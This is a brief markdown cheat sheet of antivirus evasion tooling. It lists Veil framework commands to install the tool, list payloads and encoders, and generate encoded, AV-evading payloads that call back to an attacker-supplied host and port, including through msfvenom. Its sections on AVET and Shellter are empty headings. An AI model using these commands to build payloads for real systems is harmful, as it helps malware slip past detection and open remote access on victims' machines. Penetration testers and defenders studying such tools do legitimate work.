# Antivirus evasion tools

## Veil framework

### Installation

```
apt -y install veil
/usr/share/veil/config/setup.sh --force --silent
./Veil.py --list-tools
```

### Ordnance

#### List payloads/encoders

```
./Veil.py -t Ordnance --list-payloads
./Veil.py -t Ordnance --list-encoders
```

#### Generate payload

```
./Veil.py -t Ordnance --ordnance-payload <type> --ip <lhost> --port <lport> -o <file>
./Veil.py -t Ordnance --ordnance-payload <type> --ip <lhost> --port <lport> -e <encoder> -b <badchars \\00\\0a> -o <file>
```

### Evasion

#### List payloads

```
./Veil.py -t Evasion --list-payloads
```

#### Payload with evasion

```
./Veil.py -t Evasion -p <id> --ordnance-payload <payload> --ip <lhost> --port <lport> -o <file>
./Veil.py -t Evasion -p <id> --msfvenom <payload> --ip <lhost> --port <lport> -o <file>
```



## AVET

## Shellter
